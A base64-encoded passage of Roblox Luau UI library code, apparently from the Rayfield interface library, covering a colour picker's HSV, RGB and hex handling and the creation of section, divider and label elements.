cnZpY2U6Q3JlYXRlKENvbG9yUGlja2VyLkludGVyYWN0LCBUd2VlbkluZm8ubmV3KDAuNiwgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtQb3NpdGlvbiA9IFVEaW0yLm5ldygwLjUsIDAsIDAuNSwgMCl9KTpQbGF5KCkKCQkJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKENvbG9yUGlja2VyLlJHQiwgVHdlZW5JbmZvLm5ldygwLjYsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7UG9zaXRpb24gPSBVRGltMi5uZXcoMCwgMTcsIDAsIDcwKX0pOlBsYXkoKQoJCQkJCVR3ZWVuU2VydmljZTpDcmVhdGUoQ29sb3JQaWNrZXIuSGV4SW5wdXQsIFR3ZWVuSW5mby5uZXcoMC41LCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge1Bvc2l0aW9uID0gVURpbTIubmV3KDAsIDE3LCAwLCA5MCl9KTpQbGF5KCkKCQkJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKERpc3BsYXksIFR3ZWVuSW5mby5uZXcoMC42LCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge0JhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAwfSk6UGxheSgpCgkJCQkJVHdlZW5TZXJ2aWNlOkNyZWF0ZShNYWluLk1haW5Qb2ludCwgVHdlZW5JbmZvLm5ldygwLjIsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7SW1hZ2VUcmFuc3BhcmVuY3kgPSAxfSk6UGxheSgpCgkJCQkJVHdlZW5TZXJ2aWNlOkNyZWF0ZShNYWluLCBUd2VlbkluZm8ubmV3KDAuMiwgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtJbWFnZVRyYW5zcGFyZW5jeSA9IDF9KTpQbGF5KCkKCQkJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKEJhY2tncm91bmQsIFR3ZWVuSW5mby5uZXcoMC42LCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge0JhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxfSk6UGxheSgpCgkJCQllbmQKCgkJCWVuZCkKCgkJCVVzZXJJbnB1dFNlcnZpY2UuSW5wdXRFbmRlZDpDb25uZWN0KGZ1bmN0aW9uKGlucHV0LCBnYW1lUHJvY2Vzc2VkKSBpZiBpbnB1dC5Vc2VySW5wdXRUeXBlID09IEVudW0uVXNlcklucHV0VHlwZS5Nb3VzZUJ1dHRvbjEgb3IgaW5wdXQuVXNlcklucHV0VHlwZSA9PSBFbnVtLlVzZXJJbnB1dFR5cGUuVG91Y2ggdGhlbiAKCQkJCQltYWluRHJhZ2dpbmcgPSBmYWxzZQoJCQkJCXNsaWRlckRyYWdnaW5nID0gZmFsc2UKCQkJCWVuZCBlbmQpCgkJCU1haW4uTW91c2VCdXR0b24xRG93bjpDb25uZWN0KGZ1bmN0aW9uKCkKCQkJCWlmIG9wZW5lZCB0aGVuCgkJCQkJbWFpbkRyYWdnaW5nID0gdHJ1ZSAKCQkJCWVuZAoJCQllbmQpCgkJCU1haW4uTWFpblBvaW50Lk1vdXNlQnV0dG9uMURvd246Q29ubmVjdChmdW5jdGlvbigpCgkJCQlpZiBvcGVuZWQgdGhlbgoJCQkJCW1haW5EcmFnZ2luZyA9IHRydWUgCgkJCQllbmQKCQkJZW5kKQoJCQlTbGlkZXIuTW91c2VCdXR0b24xRG93bjpDb25uZWN0KGZ1bmN0aW9uKCkKCQkJCXNsaWRlckRyYWdnaW5nID0gdHJ1ZSAKCQkJZW5kKQoJCQlTbGlkZXIuU2xpZGVyUG9pbnQuTW91c2VCdXR0b24xRG93bjpDb25uZWN0KGZ1bmN0aW9uKCkKCQkJCXNsaWRlckRyYWdnaW5nID0gdHJ1ZSAKCQkJZW5kKQoJCQlsb2NhbCBoLHMsdiA9IENvbG9yUGlja2VyU2V0dGluZ3MuQ29sb3I6VG9IU1YoKQoJCQlsb2NhbCBjb2xvciA9IENvbG9yMy5mcm9tSFNWKGgscyx2KSAKCQkJbG9jYWwgaGV4ID0gc3RyaW5nLmZvcm1hdCgiIyUwMlglMDJYJTAyWCIsY29sb3IuUioweEZGLGNvbG9yLkcqMHhGRixjb2xvci5CKjB4RkYpCgkJCUNvbG9yUGlja2VyLkhleElucHV0LklucHV0Qm94LlRleHQgPSBoZXgKCQkJbG9jYWwgZnVuY3Rpb24gc2V0RGlzcGxheSgpCgkJCQktLU1haW4KCQkJCU1haW4uTWFpblBvaW50LlBvc2l0aW9uID0gVURpbTIubmV3KHMsLU1haW4uTWFpblBvaW50LkFic29sdXRlU2l6ZS5YLzIsMS12LC1NYWluLk1haW5Qb2ludC5BYnNvbHV0ZVNpemUuWS8yKQoJCQkJTWFpbi5NYWluUG9pbnQuSW1hZ2VDb2xvcjMgPSBDb2xvcjMuZnJvbUhTVihoLHMsdikKCQkJCUJhY2tncm91bmQuQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tSFNWKGgsMSwxKQoJCQkJRGlzcGxheS5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21IU1YoaCxzLHYpCgkJCQktLVNsaWRlciAKCQkJCWxvY2FsIHggPSBoICogU2xpZGVyLkFic29sdXRlU2l6ZS5YCgkJCQlTbGlkZXIuU2xpZGVyUG9pbnQuUG9zaXRpb24gPSBVRGltMi5uZXcoMCx4LVNsaWRlci5TbGlkZXJQb2ludC5BYnNvbHV0ZVNpemUuWC8yLDAuNSwwKQoJCQkJU2xpZGVyLlNsaWRlclBvaW50LkltYWdlQ29sb3IzID0gQ29sb3IzLmZyb21IU1YoaCwxLDEpCgkJCQlsb2NhbCBjb2xvciA9IENvbG9yMy5mcm9tSFNWKGgscyx2KSAKCQkJCWxvY2FsIHIsZyxiID0gbWF0aC5mbG9vcigoY29sb3IuUioyNTUpKzAuNSksbWF0aC5mbG9vcigoY29sb3IuRyoyNTUpKzAuNSksbWF0aC5mbG9vcigoY29sb3IuQioyNTUpKzAuNSkKCQkJCUNvbG9yUGlja2VyLlJHQi5SSW5wdXQuSW5wdXRCb3guVGV4dCA9IHRvc3RyaW5nKHIpCgkJCQlDb2xvclBpY2tlci5SR0IuR0lucHV0LklucHV0Qm94LlRleHQgPSB0b3N0cmluZyhnKQoJCQkJQ29sb3JQaWNrZXIuUkdCLkJJbnB1dC5JbnB1dEJveC5UZXh0ID0gdG9zdHJpbmcoYikKCQkJCWhleCA9IHN0cmluZy5mb3JtYXQoIiMlMDJYJTAyWCUwMlgiLGNvbG9yLlIqMHhGRixjb2xvci5HKjB4RkYsY29sb3IuQioweEZGKQoJCQkJQ29sb3JQaWNrZXIuSGV4SW5wdXQuSW5wdXRCb3guVGV4dCA9IGhleAoJCQllbmQKCQkJc2V0RGlzcGxheSgpCgkJCUNvbG9yUGlja2VyLkhleElucHV0LklucHV0Qm94LkZvY3VzTG9zdDpDb25uZWN0KGZ1bmN0aW9uKCkKCQkJCWlmIG5vdCBwY2FsbChmdW5jdGlvbigpCgkJCQkJCWxvY2FsIHIsIGcsIGIgPSBzdHJpbmcubWF0Y2goQ29sb3JQaWNrZXIuSGV4SW5wdXQuSW5wdXRCb3guVGV4dCwgIl4jPygldyV3KSgldyV3KSgldyV3KSQiKQoJCQkJCQlsb2NhbCByZ2JDb2xvciA9IENvbG9yMy5mcm9tUkdCKHRvbnVtYmVyKHIsIDE2KSx0b251bWJlcihnLCAxNiksIHRvbnVtYmVyKGIsIDE2KSkKCQkJCQkJaCxzLHYgPSByZ2JDb2xvcjpUb0hTVigpCgkJCQkJCWhleCA9IENvbG9yUGlja2VyLkhleElucHV0LklucHV0Qm94LlRleHQKCQkJCQkJc2V0RGlzcGxheSgpCgkJCQkJCUNvbG9yUGlja2VyU2V0dGluZ3MuQ29sb3IgPSByZ2JDb2xvcgoJCQkJCWVuZCkgCgkJCQl0aGVuIAoJCQkJCUNvbG9yUGlja2VyLkhleElucHV0LklucHV0Qm94LlRleHQgPSBoZXggCgkJCQllbmQKCQkJCXBjYWxsKGZ1bmN0aW9uKClDb2xvclBpY2tlclNldHRpbmdzLkNhbGxiYWNrKENvbG9yMy5mcm9tSFNWKGgscyx2KSllbmQpCgkJCQlsb2NhbCByLGcsYiA9IG1hdGguZmxvb3IoKGgqMjU1KSswLjUpLG1hdGguZmxvb3IoKHMqMjU1KSswLjUpLG1hdGguZmxvb3IoKHYqMjU1KSswLjUpCgkJCQlDb2xvclBpY2tlclNldHRpbmdzLkNvbG9yID0gQ29sb3IzLmZyb21SR0IocixnLGIpCgkJCQlpZiBub3QgQ29sb3JQaWNrZXJTZXR0aW5ncy5FeHQgdGhlbgoJCQkJCVNhdmVDb25maWd1cmF0aW9uKENvbG9yUGlja2VyU2V0dGluZ3MuRmxhZy4uJ1xuJy4udG9zdHJpbmcoQ29sb3JQaWNrZXJTZXR0aW5ncy5Db2xvcikpCgkJCQllbmQKCQkJZW5kKQoJCQktLVJHQgoJCQlsb2NhbCBmdW5jdGlvbiByZ2JCb3hlcyhib3gsdG9DaGFuZ2UpCgkJCQlsb2NhbCB2YWx1ZSA9IHRvbnVtYmVyKGJveC5UZXh0KSAKCQkJCWxvY2FsIGNvbG9yID0gQ29sb3IzLmZyb21IU1YoaCxzLHYpIAoJCQkJbG9jYWwgb2xkUixvbGRHLG9sZEIgPSBtYXRoLmZsb29yKChjb2xvci5SKjI1NSkrMC41KSxtYXRoLmZsb29yKChjb2xvci5HKjI1NSkrMC41KSxtYXRoLmZsb29yKChjb2xvci5CKjI1NSkrMC41KQoJCQkJbG9jYWwgc2F2ZSAKCQkJCWlmIHRvQ2hhbmdlID09ICJSIiB0aGVuIHNhdmUgPSBvbGRSO29sZFIgPSB2YWx1ZSBlbHNlaWYgdG9DaGFuZ2UgPT0gIkciIHRoZW4gc2F2ZSA9IG9sZEc7b2xkRyA9IHZhbHVlIGVsc2Ugc2F2ZSA9IG9sZEI7b2xkQiA9IHZhbHVlIGVuZAoJCQkJaWYgdmFsdWUgdGhlbiAKCQkJCQl2YWx1ZSA9IG1hdGguY2xhbXAodmFsdWUsMCwyNTUpCgkJCQkJaCxzLHYgPSBDb2xvcjMuZnJvbVJHQihvbGRSLG9sZEcsb2xkQik6VG9IU1YoKQoKCQkJCQlzZXREaXNwbGF5KCkKCQkJCWVsc2UgCgkJCQkJYm94LlRleHQgPSB0b3N0cmluZyhzYXZlKQoJCQkJZW5kCgkJCQlsb2NhbCByLGcsYiA9IG1hdGguZmxvb3IoKGgqMjU1KSswLjUpLG1hdGguZmxvb3IoKHMqMjU1KSswLjUpLG1hdGguZmxvb3IoKHYqMjU1KSswLjUpCgkJCQlDb2xvclBpY2tlclNldHRpbmdzLkNvbG9yID0gQ29sb3IzLmZyb21SR0IocixnLGIpCgkJCQlpZiBub3QgQ29sb3JQaWNrZXJTZXR0aW5ncy5FeHQgdGhlbgoJCQkJCVNhdmVDb25maWd1cmF0aW9uKCkKCQkJCWVuZAoJCQllbmQKCQkJQ29sb3JQaWNrZXIuUkdCLlJJbnB1dC5JbnB1dEJveC5Gb2N1c0xvc3Q6Y29ubmVjdChmdW5jdGlvbigpCgkJCQlyZ2JCb3hlcyhDb2xvclBpY2tlci5SR0IuUklucHV0LklucHV0Qm94LCJSIikKCQkJCXBjYWxsKGZ1bmN0aW9uKClDb2xvclBpY2tlclNldHRpbmdzLkNhbGxiYWNrKENvbG9yMy5mcm9tSFNWKGgscyx2KSllbmQpCgkJCWVuZCkKCQkJQ29sb3JQaWNrZXIuUkdCLkdJbnB1dC5JbnB1dEJveC5Gb2N1c0xvc3Q6Y29ubmVjdChmdW5jdGlvbigpCgkJCQlyZ2JCb3hlcyhDb2xvclBpY2tlci5SR0IuR0lucHV0LklucHV0Qm94LCJHIikKCQkJCXBjYWxsKGZ1bmN0aW9uKClDb2xvclBpY2tlclNldHRpbmdzLkNhbGxiYWNrKENvbG9yMy5mcm9tSFNWKGgscyx2KSllbmQpCgkJCWVuZCkKCQkJQ29sb3JQaWNrZXIuUkdCLkJJbnB1dC5JbnB1dEJveC5Gb2N1c0xvc3Q6Y29ubmVjdChmdW5jdGlvbigpCgkJCQlyZ2JCb3hlcyhDb2xvclBpY2tlci5SR0IuQklucHV0LklucHV0Qm94LCJCIikKCQkJCXBjYWxsKGZ1bmN0aW9uKClDb2xvclBpY2tlclNldHRpbmdzLkNhbGxiYWNrKENvbG9yMy5mcm9tSFNWKGgscyx2KSllbmQpCgkJCWVuZCkKCgkJCVJ1blNlcnZpY2UuUmVuZGVyU3RlcHBlZDpjb25uZWN0KGZ1bmN0aW9uKCkKCQkJCWlmIG1haW5EcmFnZ2luZyB0aGVuIAoJCQkJCWxvY2FsIGxvY2FsWCA9IG1hdGguY2xhbXAobW91c2UuWC1NYWluLkFic29sdXRlUG9zaXRpb24uWCwwLE1haW4uQWJzb2x1dGVTaXplLlgpCgkJCQkJbG9jYWwgbG9jYWxZID0gbWF0aC5jbGFtcChtb3VzZS5ZLU1haW4uQWJzb2x1dGVQb3NpdGlvbi5ZLDAsTWFpbi5BYnNvbHV0ZVNpemUuWSkKCQkJCQlNYWluLk1haW5Qb2ludC5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLGxvY2FsWC1NYWluLk1haW5Qb2ludC5BYnNvbHV0ZVNpemUuWC8yLDAsbG9jYWxZLU1haW4uTWFpblBvaW50LkFic29sdXRlU2l6ZS5ZLzIpCgkJCQkJcyA9IGxvY2FsWCAvIE1haW4uQWJzb2x1dGVTaXplLlgKCQkJCQl2ID0gMSAtIChsb2NhbFkgLyBNYWluLkFic29sdXRlU2l6ZS5ZKQoJCQkJCURpc3BsYXkuQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tSFNWKGgscyx2KQoJCQkJCU1haW4uTWFpblBvaW50LkltYWdlQ29sb3IzID0gQ29sb3IzLmZyb21IU1YoaCxzLHYpCgkJCQkJQmFja2dyb3VuZC5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21IU1YoaCwxLDEpCgkJCQkJbG9jYWwgY29sb3IgPSBDb2xvcjMuZnJvbUhTVihoLHMsdikgCgkJCQkJbG9jYWwgcixnLGIgPSBtYXRoLmZsb29yKChjb2xvci5SKjI1NSkrMC41KSxtYXRoLmZsb29yKChjb2xvci5HKjI1NSkrMC41KSxtYXRoLmZsb29yKChjb2xvci5CKjI1NSkrMC41KQoJCQkJCUNvbG9yUGlja2VyLlJHQi5SSW5wdXQuSW5wdXRCb3guVGV4dCA9IHRvc3RyaW5nKHIpCgkJCQkJQ29sb3JQaWNrZXIuUkdCLkdJbnB1dC5JbnB1dEJveC5UZXh0ID0gdG9zdHJpbmcoZykKCQkJCQlDb2xvclBpY2tlci5SR0IuQklucHV0LklucHV0Qm94LlRleHQgPSB0b3N0cmluZyhiKQoJCQkJCUNvbG9yUGlja2VyLkhleElucHV0LklucHV0Qm94LlRleHQgPSBzdHJpbmcuZm9ybWF0KCIjJTAyWCUwMlglMDJYIixjb2xvci5SKjB4RkYsY29sb3IuRyoweEZGLGNvbG9yLkIqMHhGRikKCQkJCQlwY2FsbChmdW5jdGlvbigpQ29sb3JQaWNrZXJTZXR0aW5ncy5DYWxsYmFjayhDb2xvcjMuZnJvbUhTVihoLHMsdikpZW5kKQoJCQkJCUNvbG9yUGlja2VyU2V0dGluZ3MuQ29sb3IgPSBDb2xvcjMuZnJvbVJHQihyLGcsYikKCQkJCQlpZiBub3QgQ29sb3JQaWNrZXJTZXR0aW5ncy5FeHQgdGhlbgoJCQkJCQlTYXZlQ29uZmlndXJhdGlvbigpCgkJCQkJZW5kCgkJCQllbmQKCQkJCWlmIHNsaWRlckRyYWdnaW5nIHRoZW4gCgkJCQkJbG9jYWwgbG9jYWxYID0gbWF0aC5jbGFtcChtb3VzZS5YLVNsaWRlci5BYnNvbHV0ZVBvc2l0aW9uLlgsMCxTbGlkZXIuQWJzb2x1dGVTaXplLlgpCgkJCQkJaCA9IGxvY2FsWCAvIFNsaWRlci5BYnNvbHV0ZVNpemUuWAoJCQkJCURpc3BsYXkuQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tSFNWKGgscyx2KQoJCQkJCVNsaWRlci5TbGlkZXJQb2ludC5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLGxvY2FsWC1TbGlkZXIuU2xpZGVyUG9pbnQuQWJzb2x1dGVTaXplLlgvMiwwLjUsMCkKCQkJCQlTbGlkZXIuU2xpZGVyUG9pbnQuSW1hZ2VDb2xvcjMgPSBDb2xvcjMuZnJvbUhTVihoLDEsMSkKCQkJCQlCYWNrZ3JvdW5kLkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbUhTVihoLDEsMSkKCQkJCQlNYWluLk1haW5Qb2ludC5JbWFnZUNvbG9yMyA9IENvbG9yMy5mcm9tSFNWKGgscyx2KQoJCQkJCWxvY2FsIGNvbG9yID0gQ29sb3IzLmZyb21IU1YoaCxzLHYpIAoJCQkJCWxvY2FsIHIsZyxiID0gbWF0aC5mbG9vcigoY29sb3IuUioyNTUpKzAuNSksbWF0aC5mbG9vcigoY29sb3IuRyoyNTUpKzAuNSksbWF0aC5mbG9vcigoY29sb3IuQioyNTUpKzAuNSkKCQkJCQlDb2xvclBpY2tlci5SR0IuUklucHV0LklucHV0Qm94LlRleHQgPSB0b3N0cmluZyhyKQoJCQkJCUNvbG9yUGlja2VyLlJHQi5HSW5wdXQuSW5wdXRCb3guVGV4dCA9IHRvc3RyaW5nKGcpCgkJCQkJQ29sb3JQaWNrZXIuUkdCLkJJbnB1dC5JbnB1dEJveC5UZXh0ID0gdG9zdHJpbmcoYikKCQkJCQlDb2xvclBpY2tlci5IZXhJbnB1dC5JbnB1dEJveC5UZXh0ID0gc3RyaW5nLmZvcm1hdCgiIyUwMlglMDJYJTAyWCIsY29sb3IuUioweEZGLGNvbG9yLkcqMHhGRixjb2xvci5CKjB4RkYpCgkJCQkJcGNhbGwoZnVuY3Rpb24oKUNvbG9yUGlja2VyU2V0dGluZ3MuQ2FsbGJhY2soQ29sb3IzLmZyb21IU1YoaCxzLHYpKWVuZCkKCQkJCQlDb2xvclBpY2tlclNldHRpbmdzLkNvbG9yID0gQ29sb3IzLmZyb21SR0IocixnLGIpCgkJCQkJaWYgbm90IENvbG9yUGlja2VyU2V0dGluZ3MuRXh0IHRoZW4KCQkJCQkJU2F2ZUNvbmZpZ3VyYXRpb24oKQoJCQkJCWVuZAoJCQkJZW5kCgkJCWVuZCkKCgkJCWlmIFNldHRpbmdzLkNvbmZpZ3VyYXRpb25TYXZpbmcgdGhlbgoJCQkJaWYgU2V0dGluZ3MuQ29uZmlndXJhdGlvblNhdmluZy5FbmFibGVkIGFuZCBDb2xvclBpY2tlclNldHRpbmdzLkZsYWcgdGhlbgoJCQkJCVJheWZpZWxkTGlicmFyeS5GbGFnc1tDb2xvclBpY2tlclNldHRpbmdzLkZsYWddID0gQ29sb3JQaWNrZXJTZXR0aW5ncwoJCQkJZW5kCgkJCWVuZAoKCQkJZnVuY3Rpb24gQ29sb3JQaWNrZXJTZXR0aW5nczpTZXQoUkdCQ29sb3IpCgkJCQlDb2xvclBpY2tlclNldHRpbmdzLkNvbG9yID0gUkdCQ29sb3IKCQkJCWgscyx2ID0gQ29sb3JQaWNrZXJTZXR0aW5ncy5Db2xvcjpUb0hTVigpCgkJCQljb2xvciA9IENvbG9yMy5mcm9tSFNWKGgscyx2KQoJCQkJc2V0RGlzcGxheSgpCgkJCWVuZAoKCQkJQ29sb3JQaWNrZXIuTW91c2VFbnRlcjpDb25uZWN0KGZ1bmN0aW9uKCkKCQkJCVR3ZWVuU2VydmljZTpDcmVhdGUoQ29sb3JQaWNrZXIsIFR3ZWVuSW5mby5uZXcoMC42LCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge0JhY2tncm91bmRDb2xvcjMgPSBTZWxlY3RlZFRoZW1lLkVsZW1lbnRCYWNrZ3JvdW5kSG92ZXJ9KTpQbGF5KCkKCQkJZW5kKQoKCQkJQ29sb3JQaWNrZXIuTW91c2VMZWF2ZTpDb25uZWN0KGZ1bmN0aW9uKCkKCQkJCVR3ZWVuU2VydmljZTpDcmVhdGUoQ29sb3JQaWNrZXIsIFR3ZWVuSW5mby5uZXcoMC42LCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge0JhY2tncm91bmRDb2xvcjMgPSBTZWxlY3RlZFRoZW1lLkVsZW1lbnRCYWNrZ3JvdW5kfSk6UGxheSgpCgkJCWVuZCkKCgkJCVJheWZpZWxkLk1haW46R2V0UHJvcGVydHlDaGFuZ2VkU2lnbmFsKCdCYWNrZ3JvdW5kQ29sb3IzJyk6Q29ubmVjdChmdW5jdGlvbigpCgkJCQlmb3IgXywgcmdiaW5wdXQgaW4gaXBhaXJzKENvbG9yUGlja2VyLlJHQjpHZXRDaGlsZHJlbigpKSBkbwoJCQkJCWlmIHJnYmlucHV0OklzQSgiRnJhbWUiKSB0aGVuCgkJCQkJCXJnYmlucHV0LkJhY2tncm91bmRDb2xvcjMgPSBTZWxlY3RlZFRoZW1lLklucHV0QmFja2dyb3VuZAoJCQkJCQlyZ2JpbnB1dC5VSVN0cm9rZS5Db2xvciA9IFNlbGVjdGVkVGhlbWUuSW5wdXRTdHJva2UKCQkJCQllbmQKCQkJCWVuZAoKCQkJCUNvbG9yUGlja2VyLkhleElucHV0LkJhY2tncm91bmRDb2xvcjMgPSBTZWxlY3RlZFRoZW1lLklucHV0QmFja2dyb3VuZAoJCQkJQ29sb3JQaWNrZXIuSGV4SW5wdXQuVUlTdHJva2UuQ29sb3IgPSBTZWxlY3RlZFRoZW1lLklucHV0U3Ryb2tlCgkJCWVuZCkKCgkJCXJldHVybiBDb2xvclBpY2tlclNldHRpbmdzCgkJZW5kCgoJCS0tIFNlY3Rpb24KCQlmdW5jdGlvbiBUYWI6Q3JlYXRlU2VjdGlvbihTZWN0aW9uTmFtZSkKCgkJCWxvY2FsIFNlY3Rpb25WYWx1ZSA9IHt9CgoJCQlpZiBTRG9uZSB0aGVuCgkJCQlsb2NhbCBTZWN0aW9uU3BhY2UgPSBFbGVtZW50cy5UZW1wbGF0ZS5TZWN0aW9uU3BhY2luZzpDbG9uZSgpCgkJCQlTZWN0aW9uU3BhY2UuVmlzaWJsZSA9IHRydWUKCQkJCVNlY3Rpb25TcGFjZS5QYXJlbnQgPSBUYWJQYWdlCgkJCWVuZAoKCQkJbG9jYWwgU2VjdGlvbiA9IEVsZW1lbnRzLlRlbXBsYXRlLlNlY3Rpb25UaXRsZTpDbG9uZSgpCgkJCVNlY3Rpb24uVGl0bGUuVGV4dCA9IFNlY3Rpb25OYW1lCgkJCVNlY3Rpb24uVmlzaWJsZSA9IHRydWUKCQkJU2VjdGlvbi5QYXJlbnQgPSBUYWJQYWdlCgoJCQlTZWN0aW9uLlRpdGxlLlRleHRUcmFuc3BhcmVuY3kgPSAxCgkJCVR3ZWVuU2VydmljZTpDcmVhdGUoU2VjdGlvbi5UaXRsZSwgVHdlZW5JbmZvLm5ldygwLjcsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7VGV4dFRyYW5zcGFyZW5jeSA9IDAuNH0pOlBsYXkoKQoKCQkJZnVuY3Rpb24gU2VjdGlvblZhbHVlOlNldChOZXdTZWN0aW9uKQoJCQkJU2VjdGlvbi5UaXRsZS5UZXh0ID0gTmV3U2VjdGlvbgoJCQllbmQKCgkJCVNEb25lID0gdHJ1ZQoKCQkJcmV0dXJuIFNlY3Rpb25WYWx1ZQoJCWVuZAoKCQktLSBEaXZpZGVyCgkJZnVuY3Rpb24gVGFiOkNyZWF0ZURpdmlkZXIoKQoJCQlsb2NhbCBEaXZpZGVyVmFsdWUgPSB7fQoKCQkJbG9jYWwgRGl2aWRlciA9IEVsZW1lbnRzLlRlbXBsYXRlLkRpdmlkZXI6Q2xvbmUoKQoJCQlEaXZpZGVyLlZpc2libGUgPSB0cnVlCgkJCURpdmlkZXIuUGFyZW50ID0gVGFiUGFnZQoKCQkJRGl2aWRlci5EaXZpZGVyLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxCgkJCVR3ZWVuU2VydmljZTpDcmVhdGUoRGl2aWRlci5EaXZpZGVyLCBUd2VlbkluZm8ubmV3KDAuNSwgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMC44NX0pOlBsYXkoKQoKCQkJZnVuY3Rpb24gRGl2aWRlclZhbHVlOlNldChWYWx1ZSkKCQkJCURpdmlkZXIuVmlzaWJsZSA9IFZhbHVlCgkJCWVuZAoKCQkJcmV0dXJuIERpdmlkZXJWYWx1ZQoJCWVuZAoKCQktLSBMYWJlbAoJCWZ1bmN0aW9uIFRhYjpDcmVhdGVMYWJlbChMYWJlbFRleHQgOiBzdHJpbmcsIEljb246IG51bWJlciwgQ29sb3IgOiBDb2xvcjMsIElnbm9yZVRoZW1lIDogYm9vbGVhbikKCQkJbG9jYWwgTGFiZWxWYWx1ZSA9IHt9CgoJCQlsb2NhbCBMYWJlbCA9IEVsZW1lbnRzLlRlbXBsYXRlLkxhYmVsOkNsb25lKCkKCQkJTGFiZWwuVGl0bGUuVGV4dCA9IExhYmVsVGV4dAoJCQlMYWJlbC5WaXNpYmxlID0gdHJ1ZQoJCQlMYWJlbC5QYXJlbnQgPSBUYWJQYWdlCgoJCQlMYWJlbC5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3Igb3IgU2VsZWN0ZWRUaGVtZS5TZWNvbmRhcnlFbGVtZW50QmFja2dyb3VuZAoJCQlMYWJlbC5VSVN0cm9rZS5Db2xvciA9IENvbG9yIG9yIFNlbGVjdGVkVGhlbWUuU2Vjb25kYXJ5RWxlbWVudFN0cm9rZQoKCQkJaWYgSWNvbiB0aGVuCgkJCQlpZiB0eXBlb2YoSWNvbikgPT0gJ3N0cmluZycgYW5kIEljb25zIHRoZW4KCQkJCQlsb2NhbCBhc3NldCA9IGdldEljb24oSWNvbikKCgkJCQkJTGFiZWwuSWNvbi5JbWFnZSA9ICdyYnhhc3NldGlkOi8vJy4uYXNzZXQuaWQKCQkJCQlMYWJlbC5JY29uLkltYWdlUmVjdE9mZnNldCA9IGFzc2V0LmltYWdlUmVjdE9mZnNldAoJCQkJCUxhYmVsLkljb24uSW1hZ2VSZWN0U2l6ZSA9IGFzc2V0LmltYWdlUmVjdFNpemUKCQkJCWVsc2UKCQkJCQlMYWJlbC5JY29uLkltYWdlID0gZ2V0QXNzZXRVcmkoSWNvbikKCQkJCWVuZAoJCQllbHNlCgkJCQlMYWJlbC5JY29uLkltYWdlID0gInJieGFzc2V0aWQ6Ly8iIC4uIDAKCQkJZW5kCgoJCQlpZiBJY29uIGFuZCBMYWJlbDpGaW5kRmlyc3RDaGlsZCgnSWNvbicpIHRoZW4KCQkJCUxhYmVsLlRpdGxlLlBvc2l0aW9uID0gVURpbTIubmV3KDAsIDQ1LCAwLjUsIDApCgkJCQlMYWJlbC5UaXRsZS5TaXplID0gVURpbTIubmV3KDEsIC0xMDAsIDAsIDE0KQoKCQkJCWlmIEljb24gdGhlbgoJCQkJCWlmIHR5cGVvZihJY29uKSA9PSAnc3RyaW5nJyBhbmQgSWNvbnMgdGhlbgoJCQkJCQlsb2NhbCBhc3NldCA9IGdldEljb24oSWNvbikKCgkJCQkJCUxhYmVsLkljb24uSW1hZ2UgPSAncmJ4YXNzZXRpZDovLycuLmFzc2V0LmlkCgkJCQkJCUxhYmVsLkljb24uSW1hZ2VSZWN0T2Zmc2V0ID0gYXNzZXQuaW1hZ2VSZWN0T2Zmc2V0CgkJCQkJCUxhYmVsLkljb24uSW1hZ2VSZWN0U2l6ZSA9IGFzc2V0LmltYWdlUmVjdFNpemUKCQkJCQllbHNlCgkJCQkJCUxhYmVsLkljb24uSW1hZ2UgPSBnZXRBc3NldFVyaShJY29uKQoJCQkJCWVuZAoJCQkJZWxzZQoJCQkJCUxhYmVsLkljb24uSW1hZ2UgPSAicmJ4YXNzZXRpZDovLyIgLi4gMAoJCQkJZW5kCgoJCQkJTGFiZWwuSWNvbi5WaXNpYmxlID0gdHJ1ZQoJCQllbmQKCgkJCUxhYmVsLkljb24uSW1hZ2VUcmFuc3BhcmVuY3kgPSAxCgkJCUxhYmVsLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxCgkJCUxhYmVsLlVJU3Ryb2tlLlRyYW5zcGFyZW5jeSA9IDEKCQkJTGFiZWwuVGl0bGUuVGV4dFRyYW5zcGFyZW5jeSA9IDEKCgkJCVR3ZWVuU2VydmljZTpDcmVhdGUoTGFiZWwsIFR3ZWVuSW5mby5uZXcoMC43LCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge0JhY2tncm91bmRUcmFuc3BhcmVuY3kgPSBDb2xvciBhbmQgMC44IG9yIDB9KTpQbGF5KCkKCQkJVHdlZW5TZXJ2aWNlOkNyZWF0ZShMYWJlbC5VSVN0cm9rZSwgVHdlZW5JbmZvLm5ldygwLjcsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7VHJhbnNwYXJlbmN5ID0gQ29sb3IgYW5kIDAuNyBvciAwfSk6UGxheSgpCgkJCVR3ZWVuU2VydmljZTpDcmVhdGUoTGFiZWwuSWNvbiwgVHdlZW5JbmZvLm5ldygwLjcsIEVudW0uRWFzaW5nU3R5bGUuRXhwb